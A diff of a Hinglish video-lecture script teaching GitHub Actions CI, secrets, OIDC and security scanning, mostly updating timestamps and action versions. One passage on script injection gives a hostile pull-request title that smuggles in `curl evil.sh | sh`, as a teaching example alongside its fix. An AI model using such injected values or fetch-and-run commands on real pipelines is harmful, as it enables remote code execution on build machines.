@@ -20,19 +20,19 @@
 
 # 📺 EPISODE 1: Vault ke Andar ki Conveyor
 
-### [00:00 – 02:05] Scene 1: Foreman ke Bina Conveyor
+### [00:00 – 02:00] Scene 1: Foreman ke Bina Conveyor
 **[VISUAL: A vault (GitHub repo) with a file `.github/workflows/ci.yml`. A push lights a green check on the commit page. No foreman's office, no server anywhere in the picture.]**
 
 **(Voiceover):**
 Jenkins mein humne ek foreman hire kiya, uska daftar chalaya, uske plugins, backup aur workbenches sambhaale. GitHub Actions mein conveyor seedha vault ke andar hi hai. Ek YAML file `.github/workflows/` folder mein, aur GitHub aapke liye workbenches chalata hai. Foreman ka daftar aapko nahi sambhalna padta. Chhote aur medium projects ke liye ye bahut sahulat wala hai. Aur ek baar concept samajh gaye, to har CI tool aasaan lagta hai, kyunki Session 17 ke stations aur Jenkinsfile ka dhancha yahin dobara dikhega, bas alag shabdon mein.
 
-### [02:05 – 04:40] Scene 2: Workflow ke Hisse
+### [02:00 – 04:30] Scene 2: Workflow ke Hisse
 **[VISUAL: A YAML file with colour-coded sections: `name`, `on` (events), `jobs` → `test` → `runs-on`, `steps`. A diagram: event → workflow → jobs (side by side) → steps (in order). A table comparing Jenkins words to Actions words: Jenkinsfile → workflow, stage → job, step → step, agent → runner.]**
 
 **(Voiceover):**
 Workflow ek YAML file hai. `on` batata hai kaun si ghatna conveyor chalayegi: `push`, `pull_request`, `workflow_dispatch` jo button se chalta hai, ya `schedule` jo cron ki tarah chalta hai, aur UTC mein. `jobs` mein kaam hote hain, aur ye default mein ek saath chalte hain. Har job ke paas `runs-on` hota hai, yaani kaun si workbench, jaise `ubuntu-latest`, ek bilkul saaf machine jo job ke baad gayab ho jaati hai. Job ke andar `steps` ek ke baad ek: ya `run` se shell command, ya `uses` se koi taiyaar action, jaise `actions/checkout`. Jenkins se tulna: Jenkinsfile ki jagah workflow, stage ki jagah job, aur agent ki jagah runner.
 
-### [04:40 – 07:10] Scene 3: Pehla Workflow
+### [04:30 – 06:55] Scene 3: Pehla Workflow
 **[VISUAL: A `ci.yml` for the Flask service: checkout, setup-python, install, pytest. The Actions tab shows a green run with per-step logs and timings.]**
 
 **(Voiceover):**
@@ -44,33 +44,33 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-python@v5
+      - uses: actions/checkout@v7
+      - uses: actions/setup-python@v7
         with: { python-version: '3.12' }
       - run: pip install -r requirements.txt
       - run: pytest -q
 ```
 Push karte hi Actions tab mein run dikhta hai, har step ke log ke saath. Test fail ho to pull request par laal cross aata hai, aur wahi Session 19 jaisa required check ban sakta hai. Ek aur cheez: step ka exit code non-zero ho to job fail. Ye wahi Session 6 ka sabak hai, jo har CI tool ke neeche chalta hai.
 
-### [07:10 – 09:40] Scene 4: Workbench: Hosted aur Self-hosted
+### [06:55 – 09:20] Scene 4: Workbench: Hosted aur Self-hosted
 **[VISUAL: Two runner types. Left: GitHub-hosted, a fresh virtual machine per job with a small meter of minutes. Right: self-hosted, your own building in a private wing, with a connection arrow going out to GitHub. A warning on the right: "never on a public repo".]**
 
 **(Voiceover):**
 Workbench do tarah ki hoti hain. GitHub-hosted: har job ke liye ek naya saaf machine, jise GitHub chalata hai, aur uske minutes ka hisaab plan ke saath badalta hai, isliye live billing page dekho. Self-hosted: aapki apni building, jaise Session 19 ki private wing wali workbench, jo GitHub se bahar ki taraf jud jaati hai. Ye tab kaam aati hai jab job ko aapke private network tak pahunchna ho, ya khaas hardware chahiye. Par ek chetavni: self-hosted runner ko public repo par kabhi mat chalao. Koi bhi pull request ka code us workbench par chal sakta hai, aur wahan aapke network ki chaabiyan hain.
 
-### [09:40 – 12:15] Scene 5: Action ko Pin Karo
-**[VISUAL: Three ways to reference an action. `actions/checkout@v4` (a moving tag), `some-org/tool@main` (a branch, red), `some-org/tool@3f2a...` (a full commit SHA, green). A Dependabot pull request that updates the SHA with a comment of the version.]**
+### [09:20 – 12:25] Scene 5: Action ko Pin Karo
+**[VISUAL: Three ways to reference an action. `actions/checkout@v7` (a moving tag), `some-org/tool@main` (a branch, red), `some-org/tool@3f2a...` (a full commit SHA, green). A Dependabot pull request that updates the SHA with a comment of the version.]**
 
 **(Voiceover):**
-`uses:` mein aap kisi aur ka code apni conveyor mein bula rahe ho. Isliye usse bharose se bulao. Branch ka naam, jaise `@main`, kabhi nahi: wo kal kuch bhi ho sakta hai. Tag, jaise `@v4`, theek hai bharose ke publishers ke liye. Sabse surakshit: poora commit SHA, jaise `@3f2a...`, jo badal nahi sakta. Tab updates ko haath se mat dhoondho: Dependabot actions ke updates ke pull request khud bana deta hai, jisme SHA aur version dono likhe hote hain. Session 16B ka chief architect un pull requests ko review karke merge karta hai. Aur ek aur niyam: third-party action jo aapke secrets dekhti ho, use pehle padh lo.
+`uses:` mein aap kisi aur ka code apni conveyor mein bula rahe ho. Isliye usse bharose se bulao. Branch ka naam, jaise `@main`, kabhi nahi: wo kal kuch bhi ho sakta hai. Tag, jaise `@v7`, theek hai bharose ke publishers ke liye. Version number badalte rehte hain: jo hum likhte hain wo nawambar 2026 ke hain, aur actions ka releases page dekh kar apna version chuno. Sabse surakshit: poora commit SHA, jaise `@3f2a...`, jo badal nahi sakta. Tab updates ko haath se mat dhoondho: Dependabot actions ke updates ke pull request khud bana deta hai, jisme SHA aur version dono likhe hote hain. Session 16B ka chief architect un pull requests ko review karke merge karta hai. Aur ek aur niyam: third-party action jo aapke secrets dekhti ho, use pehle padh lo.
 
-### [12:15 – 14:55] Scene 6: Lab: Apni Conveyor Banao
+### [12:25 – 15:00] Scene 6: Lab: Apni Conveyor Banao
 **[VISUAL: A small Flask repo with `app.py`, `test_app.py` and `requirements.txt`. Add the workflow file, push, green check. Break a test, push, red check on the pull request. Branch protection requires the check.]**
 
 **(Voiceover):**
 Lab. Ek chhota repo banao jisme `app.py` mein ek function ho, jaise `nights(check_in, check_out)`, aur `test_app.py` mein `pytest` ke do tests. `.github/workflows/ci.yml` mein upar wala workflow rakho, aur push karo. Actions tab mein run kholo aur har step ka log dekho. Ab ek test jaan boojh kar tod do, ek branch par, aur pull request kholo. Check laal hoga. Phir branch protection mein ye check required karo, jaise Session 19 mein Jenkins ka check tha, aur dekho ki merge ka button grey ho jaata hai. Test theek karo aur check hara. Ab aapki conveyor vault ke andar hi rehti hai, aur uske badlaav bhi pull request se hote hain.
 
-### [14:55 – 15:25] Scene 7: Recap aur Bridge
+### [15:00 – 15:30] Scene 7: Recap aur Bridge
 **[VISUAL: A card: "workflow = Jenkinsfile · on = event · jobs side by side · steps in order · hosted runner vs self-hosted · pin actions · required check".]**
 
 **(Voiceover):**
@@ -151,7 +151,7 @@ Secrets repository ya environment level par rakhte hain, aur workflow mein `${{ 
 Ek bahut aam galti. Workflow mein `run: echo "${{ github.event.pull_request.title }}"` likha hai. `${{ }}` ke andar ki cheez shell chalne se pehle text mein bhar di jaati hai. Agar koi pull request ka title likhe `fix"; curl evil.sh | sh; "`, to wo title command ban jaata hai aur aapki workbench par chal jaata hai. Ye script injection hai, aur Session 17 ke double quotes ke jaal ka bada bhai. Hal: bahar ke text ko pehle `env:` mein daalo, aur shell mein `"$TITLE"` ki tarah use karo, jahan shell use sirf data maanta hai. Aur `pull_request_target` jaise events se bacho, kyunki wo base repo ke secrets ke saath bahar ka code chala sakte hain.
 
 ### [07:25 – 09:55] Scene 4: OIDC: Duty Badge Bina Chaabi ke
-**[VISUAL: A sequence. 1: the workflow asks the vault for an identity token. 2: it presents the token to AWS STS. 3: STS checks the role's trust policy (repo and branch or environment). 4: STS returns short-lived credentials. A YAML snippet: `permissions: { id-token: write, contents: read }` and `aws-actions/configure-aws-credentials@v4` with `role-to-assume` and `aws-region`.]**
+**[VISUAL: A sequence. 1: the workflow asks the vault for an identity token. 2: it presents the token to AWS STS. 3: STS checks the role's trust policy (repo and branch or environment). 4: STS returns short-lived credentials. A YAML snippet: `permissions: { id-token: write, contents: read }` and `aws-actions/configure-aws-credentials@v6` with `role-to-assume` and `aws-region`.]**
 
 **(Voiceover):**
 OIDC mein workbench vault se ek chhota identity token maangti hai, use AWS ke saamne rakhti hai, aur AWS dekhta hai ki role ki trust policy ke hisaab se ye repo aur branch ya environment allowed hai ya nahi. Allowed ho to chhota, kuch minute ka credential milta hai, jaise Session 9 ke assume-role mein tha. Koi chaabi vault mein hai hi nahi. Workflow mein `permissions: id-token: write` aur `aws-actions/configure-aws-credentials` ke saath `role-to-assume`. AWS mein ek identity provider `token.actions.githubusercontent.com` banta hai, aur role ki trust policy mein `sub` ki shart likhte hain, jaise `repo:atithi/rooms-service:ref:refs/heads/main`. Ye shart zaroori hai: bina iske koi bhi repo wo role le sakta hai.
@@ -178,23 +178,23 @@ Recap: secrets, token ki ijaazat, script injection aur OIDC. Ab conveyor mein in
 
 # 📺 EPISODE 4: Conveyor mein Inspection
 
-### [00:00 – 01:55] Scene 1: Security Aakhir mein Kyun?
+### [00:00 – 01:50] Scene 1: Security Aakhir mein Kyun?
 **[VISUAL: A timeline: code → fabricate → inspect → deliver → live. At the far end a security reviewer holds a "stop" sign and releases slip by weeks. The next frame: small inspection gates placed along the whole timeline.]**
 
 **(Voiceover):**
 Purane tareeke mein security team release ke bilkul aakhir mein aati thi. Ek bada issue mila to hafton ki deri, aur sab ek doosre se naraaz. DevSecOps ka matlab hai ki security conveyor ke har station par chhote automatic jaanch ban kar rahe, shuru se. Isse "shift left" kehte hain: problem jitni jaldi pakdi, utni sasti. Aur ek aur faayda: developer ko jawab turant milta hai, usi pull request mein, jab wo kaam abhi uske dimaag mein hai.
 
-### [01:55 – 04:30] Scene 2: Inspection ki Parten
+### [01:50 – 04:20] Scene 2: Inspection ki Parten
 **[VISUAL: A conveyor with five inspection points. 1 Secrets scan (Gitleaks). 2 Blueprint inspector for our own code (CodeQL, SonarQube). 3 Dependency check (pip-audit, Dependabot). 4 X-ray for the finished truck design (Trivy). 5 Infrastructure plan scan (Checkov, tfsec). Each with a one-line "catches".]**
 
 **(Voiceover):**
 Paanch parten yaad rakho. Ek: secrets scan, jaise Gitleaks, jo dekhta hai ki kisi ne key ya token commit to nahi kiya. Do: blueprint inspector, yaani SAST, jaise CodeQL ya SonarQube, jo hamare apne code mein galat pattern dhoondhta hai, jaise SQL injection. Teen: dependency scan, yaani SCA, jaise pip-audit aur Dependabot, jo bahar ke packages ki known kamzoriyan dhoondhta hai. Chaar: X-ray, yaani Trivy, jo finished truck design, yaani Docker image, ke andar ke packages jaanchta hai. Paanch: infrastructure code ka scan, jaise Terraform ke liye Checkov, jo hum aage dekhenge. Har tool alag cheez pakadta hai, aur koi ek tool sab kuch nahi karta.
 
-### [04:30 – 06:50] Scene 3: Pehla Gate: Commit se Pehle
+### [04:20 – 06:50] Scene 3: Pehla Gate: Commit se Pehle
 **[VISUAL: A designer's laptop. `git commit` runs a `pre-commit` hook that calls `gitleaks protect --staged` and refuses the commit with a message showing the line and file. A line "the hook is the first gate; the conveyor is the second".]**
 
 **(Voiceover):**
-Sabse sasta gate commit se pehle hai. Session 16 ka pre-commit hook yaad hai? Ek hook jo staged files par secrets scan chalaye, jaise `gitleaks protect --staged`, aur secret mile to commit hone hi na de. Ye pehla gate hai, kyunki key commit hone se pehle hi rok li jaati hai, aur history mein kabhi jaati hi nahi. Par hook designer ki apni laptop par hai aur use skip kiya ja sakta hai, `--no-verify` se. Isliye conveyor dusra gate hai, jise koi skip nahi kar sakta. Dono chahiye: ek jaldi ke liye, ek bharose ke liye.
+Sabse sasta gate commit se pehle hai. Session 16 ka pre-commit hook yaad hai? Ek hook jo staged files par secrets scan chalaye, jaise `gitleaks protect --staged`, ya naye version ka `gitleaks git --staged`, aur secret mile to commit hone hi na de. Ye pehla gate hai, kyunki key commit hone se pehle hi rok li jaati hai, aur history mein kabhi jaati hi nahi. Par hook designer ki apni laptop par hai aur use skip kiya ja sakta hai, `--no-verify` se. Isliye conveyor dusra gate hai, jise koi skip nahi kar sakta. Dono chahiye: ek jaldi ke liye, ek bharose ke liye.
 
 ### [06:50 – 09:40] Scene 4: Gate Sochkar Lagao: Shor Nahi, Signal
 **[VISUAL: A scan report sorted by severity (CRITICAL, HIGH, MEDIUM, LOW). A policy card: "fail on CRITICAL and HIGH that have a fix; report the rest". A triage board: Fix now, Accept risk (with reason and expiry), False positive. A `.trivyignore` file with a comment line and an expiry date.]**
@@ -202,13 +202,13 @@ Sabse sasta gate commit se pehle hai. Session 16 ka pre-commit hook yaad hai? Ek
 **(Voiceover):**
 Har finding par build fail karoge, to conveyor roz toot jayegi, aur team use ignore karna seekh legi. Wahi shor wali baat jo Session 15 ke alarm mein thi. Isliye gate sochkar lagao. CRITICAL aur HIGH, jinka fix available hai, un par build fail. Baaki ko report karo aur plan karo. Kuch findings false positive hongi, aur kuch par risk accept karna padega, par uska karan aur samay-seema likhni chahiye, jaise `.trivyignore` mein comment ke saath. Aur ek aur niyam: security job ko required check banao, warna wo sirf suggestion rehta hai. Aur dependencies ke updates Dependabot khud pull request mein bhej deta hai, to naye version tak pahunchna roz ka chhota kaam rahe, saal ka bada nahi.
 
-### [09:40 – 12:25] Scene 5: Lab: Security Job
+### [09:40 – 12:20] Scene 5: Lab: Security Job
 **[VISUAL: A workflow with a `security` job: Gitleaks action, `pip install pip-audit && pip-audit -r requirements.txt`, and `trivy fs --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 .`. A deliberately old vulnerable package pin fails the job. After the upgrade, the job passes and the pull request check turns green.]**
 
 **(Voiceover):**
 Lab. Workflow mein ek `security` job jodo. Secrets scan ke liye Gitleaks ka official action. Dependencies ke liye `pip install pip-audit && pip-audit -r requirements.txt`. Aur Trivy ka filesystem scan: `trivy fs --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 .`. Ab `requirements.txt` mein jaan boojh kar ek purana, jaana-maana vulnerable package version rakho, aur dekho ki job fail hoti hai. Report padho: package, kamzori ka ID, aur kis version mein fix hai. Version upgrade karo aur job pass karao. Phir ek pre-commit hook lagao jo gitleaks se staged files dekhe, aur ek nakli key likh kar commit karne ki koshish karo: hook use rok dega. Naye tool versions ke liye unki official docs dekhna.
 
-### [12:25 – 14:20] Scene 6: Recap aur Bridge
+### [12:20 – 14:15] Scene 6: Recap aur Bridge
 **[VISUAL: A card: "shift left · secrets / SAST / dependency / image / IaC · hook first, conveyor second · fail on fixable HIGH+ · triage with reasons · required check". Then an empty truck-shaped outline appears in the courtyard of a building.]**
 
 **(Voiceover):**
